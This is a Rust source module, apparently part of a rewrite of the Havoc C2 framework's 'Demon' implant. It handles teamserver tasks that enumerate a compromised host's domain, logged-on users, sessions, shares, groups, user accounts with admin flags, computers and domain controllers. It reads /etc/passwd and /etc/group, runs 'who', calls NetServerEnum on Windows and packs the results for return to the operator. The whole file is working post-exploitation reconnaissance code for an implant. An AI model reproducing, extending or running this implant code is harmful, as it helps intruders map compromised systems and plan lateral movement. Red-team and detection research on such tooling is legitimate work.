//! Network discovery and enumeration handlers.

use std::process::{Command as SysCommand, Stdio};

use red_cell_common::demon::{DemonCommand, DemonNetCommand};
use tracing::{info, warn};

use super::{
    DispatchResult, Response, decode_utf16le_null, parse_bytes_le, parse_u32_le, write_bytes_le,
    write_u32_le, write_utf16le,
};

// ─── COMMAND_NET (2100) ─────────────────────────────────────────────────────

/// Handle a `CommandNet` task: dispatch to the appropriate network-discovery
/// subcommand handler.
///
/// Incoming payload (LE): `[subcommand: u32][...subcommand-specific fields]`
pub(super) fn handle_net(payload: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let subcmd_raw = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandNet: failed to parse subcommand: {e}");
            return DispatchResult::Ignore;
        }
    };

    let subcmd = match DemonNetCommand::try_from(subcmd_raw) {
        Ok(c) => c,
        Err(_) => {
            warn!(subcmd_raw, "CommandNet: unknown subcommand");
            return DispatchResult::Ignore;
        }
    };

    info!(subcommand = ?subcmd, "CommandNet dispatch");

    let rest = &payload[offset..];
    match subcmd {
        DemonNetCommand::Domain => handle_net_domain(),
        DemonNetCommand::Logons => handle_net_logons(rest),
        DemonNetCommand::Sessions => handle_net_sessions(rest),
        DemonNetCommand::Computer => handle_net_computer(rest),
        DemonNetCommand::DcList => handle_net_dclist(rest),
        DemonNetCommand::Share => handle_net_share(rest),
        DemonNetCommand::LocalGroup => handle_net_groups(subcmd_raw, rest),
        DemonNetCommand::Group => handle_net_groups(subcmd_raw, rest),
        DemonNetCommand::Users => handle_net_users(rest),
    }
}

/// `DEMON_NET_COMMAND_DOMAIN` (1): return the DNS domain name of the machine.
///
/// Response payload (LE): `[1: u32][domain_string: len-prefixed bytes]`
fn handle_net_domain() -> DispatchResult {
    let domain = platform_domain_name();
    info!(domain = %domain, "NetDomain");

    let mut payload = Vec::new();
    write_u32_le(&mut payload, u32::from(DemonNetCommand::Domain));
    // Domain uses plain ASCII/UTF-8 string (not UTF-16), matching Havoc's PackageAddString.
    write_bytes_le(&mut payload, domain.as_bytes());

    DispatchResult::Respond(Response::new(DemonCommand::CommandNet, payload))
}

/// `DEMON_NET_COMMAND_LOGONS` (2): enumerate logged-on users.
///
/// Incoming: `[server_name: len-prefixed UTF-16LE]`
/// Response (LE): `[2: u32][server_name: UTF-16LE][username: UTF-16LE]…`
fn handle_net_logons(rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let server_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("NetLogons: failed to parse server name: {e}");
            return DispatchResult::Ignore;
        }
    };
    let server = decode_utf16le_null(&server_bytes);

    let users = platform_logged_on_users();
    info!(server = %server, count = users.len(), "NetLogons");

    let mut payload = Vec::new();
    write_u32_le(&mut payload, u32::from(DemonNetCommand::Logons));
    write_utf16le(&mut payload, &server);
    for user in &users {
        write_utf16le(&mut payload, user);
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandNet, payload))
}

/// `DEMON_NET_COMMAND_SESSIONS` (3): enumerate active sessions.
///
/// Incoming: `[server_name: len-prefixed UTF-16LE]`
/// Response (LE): `[3: u32][server_name: UTF-16LE][client: UTF-16LE][user: UTF-16LE][time: u32][idle: u32]…`
fn handle_net_sessions(rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let server_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("NetSessions: failed to parse server name: {e}");
            return DispatchResult::Ignore;
        }
    };
    let server = decode_utf16le_null(&server_bytes);

    let sessions = platform_sessions();
    info!(server = %server, count = sessions.len(), "NetSessions");

    let mut payload = Vec::new();
    write_u32_le(&mut payload, u32::from(DemonNetCommand::Sessions));
    write_utf16le(&mut payload, &server);
    for session in &sessions {
        write_utf16le(&mut payload, &session.client);
        write_utf16le(&mut payload, &session.user);
        write_u32_le(&mut payload, session.active_secs);
        write_u32_le(&mut payload, session.idle_secs);
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandNet, payload))
}

/// `DEMON_NET_COMMAND_COMPUTER` (4) / `DEMON_NET_COMMAND_DCLIST` (5): name lists.
///
/// Computer and DcList are stubs in the original Havoc Demon. We implement the
/// wire format so the teamserver can parse a valid (possibly empty) response.
///
/// `DEMON_NET_COMMAND_COMPUTER` (4): enumerate computers in the domain.
///
/// Incoming: `[domain: len-prefixed UTF-16LE]`
/// Response (LE): `[4: u32][domain: UTF-16LE][computer_name: UTF-16LE]…`
fn handle_net_computer(rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let domain_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("NetComputer: failed to parse domain: {e}");
            return DispatchResult::Ignore;
        }
    };
    let domain = decode_utf16le_null(&domain_bytes);

    let computers = platform_computers(&domain);
    info!(domain = %domain, count = computers.len(), "NetComputer");

    let mut payload = Vec::new();
    write_u32_le(&mut payload, u32::from(DemonNetCommand::Computer));
    write_utf16le(&mut payload, &domain);
    for name in &computers {
        write_utf16le(&mut payload, name);
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandNet, payload))
}

/// `DEMON_NET_COMMAND_DCLIST` (5): list domain controllers.
///
/// Incoming: `[domain: len-prefixed UTF-16LE]`
/// Response (LE): `[5: u32][domain: UTF-16LE][dc_name: UTF-16LE]…`
fn handle_net_dclist(rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let domain_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("NetDcList: failed to parse domain: {e}");
            return DispatchResult::Ignore;
        }
    };
    let domain = decode_utf16le_null(&domain_bytes);

    let dcs = platform_dc_list(&domain);
    info!(domain = %domain, count = dcs.len(), "NetDcList");

    let mut payload = Vec::new();
    write_u32_le(&mut payload, u32::from(DemonNetCommand::DcList));
    write_utf16le(&mut payload, &domain);
    for name in &dcs {
        write_utf16le(&mut payload, name);
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandNet, payload))
}

/// `DEMON_NET_COMMAND_SHARE` (6): enumerate network shares.
///
/// Incoming: `[server_name: len-prefixed UTF-16LE]`
/// Response (LE): `[6: u32][server_name: UTF-16LE][name: UTF-16LE][path: UTF-16LE][remark: UTF-16LE][permissions: u32]…`
fn handle_net_share(rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let server_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("NetShare: failed to parse server name: {e}");
            return DispatchResult::Ignore;
        }
    };
    let server = decode_utf16le_null(&server_bytes);

    let shares = platform_shares();
    info!(server = %server, count = shares.len(), "NetShare");

    let mut payload = Vec::new();
    write_u32_le(&mut payload, u32::from(DemonNetCommand::Share));
    write_utf16le(&mut payload, &server);
    for share in &shares {
        write_utf16le(&mut payload, &share.name);
        write_utf16le(&mut payload, &share.path);
        write_utf16le(&mut payload, &share.remark);
        write_u32_le(&mut payload, share.permissions);
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandNet, payload))
}

/// `DEMON_NET_COMMAND_LOCALGROUP` (7) / `DEMON_NET_COMMAND_GROUP` (8): group enumeration.
///
/// Incoming: `[server_name: len-prefixed UTF-16LE]`
/// Response (LE): `[subcmd: u32][server_name: UTF-16LE][name: UTF-16LE][description: UTF-16LE]…`
fn handle_net_groups(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let server_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!(subcmd_raw, "NetGroups: failed to parse server name: {e}");
            return DispatchResult::Ignore;
        }
    };
    let server = decode_utf16le_null(&server_bytes);

    let groups = platform_groups();
    info!(server = %server, count = groups.len(), subcmd = subcmd_raw, "NetGroups");

    let mut payload = Vec::new();
    write_u32_le(&mut payload, subcmd_raw);
    write_utf16le(&mut payload, &server);
    for group in &groups {
        write_utf16le(&mut payload, &group.name);
        write_utf16le(&mut payload, &group.description);
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandNet, payload))
}

/// `DEMON_NET_COMMAND_USER` (9): enumerate users on a target host.
///
/// Incoming: `[server_name: len-prefixed UTF-16LE]`
/// Response (LE): `[9: u32][server_name: UTF-16LE][username: UTF-16LE][is_admin: u32]…`
fn handle_net_users(rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let server_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("NetUsers: failed to parse server name: {e}");
            return DispatchResult::Ignore;
        }
    };
    let server = decode_utf16le_null(&server_bytes);

    let users = platform_users();
    info!(server = %server, count = users.len(), "NetUsers");

    let mut payload = Vec::new();
    write_u32_le(&mut payload, u32::from(DemonNetCommand::Users));
    write_utf16le(&mut payload, &server);
    for user in &users {
        write_utf16le(&mut payload, &user.name);
        write_u32_le(&mut payload, u32::from(user.is_admin));
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandNet, payload))
}

// ─── Net data structures ────────────────────────────────────────────────────

/// An active network session entry (maps to `SESSION_INFO_10` on Windows).
struct NetSession {
    client: String,
    user: String,
    active_secs: u32,
    idle_secs: u32,
}

/// A network share entry (maps to `SHARE_INFO_502` on Windows).
struct NetShare {
    name: String,
    path: String,
    remark: String,
    permissions: u32,
}

/// A group entry with name and description.
struct NetGroup {
    name: String,
    description: String,
}

/// A user entry with an admin flag.
struct NetUser {
    name: String,
    is_admin: bool,
}

// ─── Platform data collection ───────────────────────────────────────────────
//
// These functions gather host-native data.  On Windows the real Win32 Net*
// APIs will be called (future work gated behind `#[cfg(windows)]`).  On
// Linux we use /proc, /etc/passwd, /etc/group, and utmp-style parsing so
// that the handler logic and wire format can be fully tested on CI.

/// Return the DNS domain name of this machine.
fn platform_domain_name() -> String {
    // Try /proc/sys/kernel/domainname first (Linux).
    if let Ok(raw) = std::fs::read_to_string("/proc/sys/kernel/domainname") {
        let trimmed = raw.trim();
        if !trimmed.is_empty() && trimmed != "(none)" {
            return trimmed.to_string();
        }
    }
    // Fallback: try the `hostname` command's domain part.
    if let Ok(output) =
        SysCommand::new("hostname").arg("-d").stdout(Stdio::piped()).stderr(Stdio::null()).output()
    {
        let domain = String::from_utf8_lossy(&output.stdout).trim().to_string();
        if !domain.is_empty() {
            return domain;
        }
    }
    String::new()
}

/// Enumerate currently logged-on users.
fn platform_logged_on_users() -> Vec<String> {
    let mut users = Vec::new();
    if let Ok(output) = SysCommand::new("who").stdout(Stdio::piped()).stderr(Stdio::null()).output()
    {
        let text = String::from_utf8_lossy(&output.stdout);
        for line in text.lines() {
            if let Some(name) = line.split_whitespace().next() {
                if !users.contains(&name.to_string()) {
                    users.push(name.to_string());
                }
            }
        }
    }
    users
}

/// Enumerate active login sessions with timing information.
fn platform_sessions() -> Vec<NetSession> {
    let mut sessions = Vec::new();
    if let Ok(output) = SysCommand::new("who").stdout(Stdio::piped()).stderr(Stdio::null()).output()
    {
        let text = String::from_utf8_lossy(&output.stdout);
        for line in text.lines() {
            let parts: Vec<&str> = line.split_whitespace().collect();
            if parts.len() >= 2 {
                sessions.push(NetSession {
                    client: parts.get(1).unwrap_or(&"").to_string(),
                    user: parts.first().unwrap_or(&"").to_string(),
                    active_secs: 0,
                    idle_secs: 0,
                });
            }
        }
    }
    sessions
}

/// Enumerate network shares (Linux: currently returns empty).
fn platform_shares() -> Vec<NetShare> {
    // On Windows this would call NetShareEnum.  On Linux there is no direct
    // equivalent without Samba — return an empty list.
    Vec::new()
}

/// Enumerate local groups from `/etc/group`.
fn platform_groups() -> Vec<NetGroup> {
    let mut groups = Vec::new();
    if let Ok(content) = std::fs::read_to_string("/etc/group") {
        for line in content.lines() {
            if line.starts_with('#') || line.is_empty() {
                continue;
            }
            let parts: Vec<&str> = line.splitn(4, ':').collect();
            if let Some(name) = parts.first() {
                groups.push(NetGroup { name: (*name).to_string(), description: String::new() });
            }
        }
    }
    groups
}

/// Enumerate local users from `/etc/passwd`.
fn platform_users() -> Vec<NetUser> {
    let mut users = Vec::new();
    if let Ok(content) = std::fs::read_to_string("/etc/passwd") {
        for line in content.lines() {
            if line.starts_with('#') || line.is_empty() {
                continue;
            }
            let parts: Vec<&str> = line.splitn(4, ':').collect();
            if let Some(name) = parts.first() {
                // UID 0 = root = admin equivalent
                let uid: u32 = parts.get(2).and_then(|s| s.parse().ok()).unwrap_or(u32::MAX);
                users.push(NetUser { name: (*name).to_string(), is_admin: uid == 0 });
            }
        }
    }
    users
}

/// Enumerate computers in `domain` using `NetServerEnum`.
///
/// On Windows calls `NetServerEnum` with `SV_TYPE_ALL` scoped to the given
/// domain.  On non-Windows returns an empty list (no equivalent API).
fn platform_computers(domain: &str) -> Vec<String> {
    #[cfg(windows)]
    {
        platform_servers_by_type(
            domain,
            windows_sys::Win32::NetworkManagement::NetManagement::SV_TYPE_ALL,
        )
    }
    #[cfg(not(windows))]
    {
        let _ = domain;
        Vec::new()
    }
}

/// Enumerate domain controllers in `domain` using `NetServerEnum`.
///
/// On Windows calls `NetServerEnum` filtering to DC and backup-DC server
/// types.  On non-Windows returns an empty list (no equivalent API).
fn platform_dc_list(domain: &str) -> Vec<String> {
    #[cfg(windows)]
    {
        use windows_sys::Win32::NetworkManagement::NetManagement::{
            SV_TYPE_DOMAIN_BAKCTRL, SV_TYPE_DOMAIN_CTRL,
        };
        platform_servers_by_type(domain, SV_TYPE_DOMAIN_CTRL | SV_TYPE_DOMAIN_BAKCTRL)
    }
    #[cfg(not(windows))]
    {
        let _ = domain;
        Vec::new()
    }
}

/// Shared helper: call `NetServerEnum` with the given `server_type` mask
/// against `domain` and return the list of server names.
#[cfg(windows)]
#[allow(unsafe_code)]
fn platform_servers_by_type(domain: &str, server_type: u32) -> Vec<String> {
    use windows_sys::Win32::Foundation::ERROR_MORE_DATA;
    use windows_sys::Win32::NetworkManagement::NetManagement::{
        NetApiBufferFree, NetServerEnum, SERVER_INFO_101,
    };

    // Encode domain as null-terminated UTF-16.
    let domain_w: Vec<u16> = domain.encode_utf16().chain(std::iter::once(0)).collect();
    let domain_ptr = if domain.is_empty() { std::ptr::null() } else { domain_w.as_ptr() };

    let mut names = Vec::new();
    let mut resume_handle: u32 = 0;

    loop {
        let mut buf: *mut u8 = std::ptr::null_mut();
        let mut entries_read: u32 = 0;
        let mut total_entries: u32 = 0;

        // SAFETY: All pointers are valid; `buf` is written by the API and
        // must be freed with `NetApiBufferFree`.
        let status = unsafe {
            NetServerEnum(
                std::ptr::null(), // local machine as server
                101,              // SERVER_INFO_101
                &mut buf,
                u32::MAX, // MAX_PREFERRED_LENGTH
                &mut entries_read,
                &mut total_entries,
                server_type,
                domain_ptr,
                &mut resume_handle,
            )
        };

        if !buf.is_null() && entries_read > 0 {
            // SAFETY: `buf` points to an array of `entries_read` SERVER_INFO_101 structs.
            let entries = unsafe {
                std::slice::from_raw_parts(buf as *const SERVER_INFO_101, entries_read as usize)
            };
            for entry in entries {
                if !entry.sv101_name.is_null() {
                    // SAFETY: `sv101_name` is a valid null-terminated UTF-16 string.
                    let name = unsafe {
                        let mut len = 0usize;
                        while *entry.sv101_name.add(len) != 0 {
                            len += 1;
                        }
                        std::slice::from_raw_parts(entry.sv101_name, len)
                    };
                    names.push(String::from_utf16_lossy(name).into_owned());
                }
            }
        }

        if !buf.is_null() {
            // SAFETY: `buf` was allocated by `NetServerEnum`.
            unsafe { NetApiBufferFree(buf as *mut _) };
        }

        if status != ERROR_MORE_DATA {
            break;
        }
    }

    names
}
